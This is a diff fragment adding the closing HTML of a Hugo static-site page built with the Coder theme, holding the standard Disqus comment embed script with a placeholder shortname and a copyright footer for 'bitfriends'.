+<!-- raw HTML omitted --></p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        <div id="disqus_thread"></div>
+<script>
+  window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+    
+    document.addEventListener('themeChanged', function (e) { 
+        if (document.readyState == 'complete') {
+          DISQUS.reset({ reload: true, config: disqus_config });
+        }
+    });
+</script>
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     bitfriends 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
